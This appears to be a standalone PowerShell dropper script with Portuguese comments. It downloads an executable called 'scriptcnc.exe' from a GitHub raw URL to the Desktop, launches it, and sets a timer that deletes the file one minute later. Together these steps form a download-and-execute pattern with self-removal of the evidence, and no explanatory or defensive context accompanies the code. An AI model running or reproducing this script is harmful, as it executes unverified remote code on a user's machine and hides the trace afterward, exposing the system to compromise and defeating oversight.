$url = "https://github.com/gean3721/executaveis/raw/main/scriptcnc.exe"
$destination = [System.Environment]::GetFolderPath("Desktop") + "\scriptcnc.exe"

Invoke-WebRequest -Uri $url -OutFile $destination

# Verifica se o download foi bem-sucedido
if (Test-Path $destination) {
    Start-Process -FilePath $destination

    # Agendar a exclusão após 1 minuto
    $timer = New-Object System.Timers.Timer
    $timer.Interval = 60000 # 1 minuto em milissegundos
    $timer.AutoReset = $false
    $timer.Enabled = $true

    Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action {
        # Deleta o arquivo após 1 minuto
        Remove-Item -Path $destination -Force
        $timer.Dispose()
    }
} else {
    Write-Host "Erro ao baixar o arquivo."
}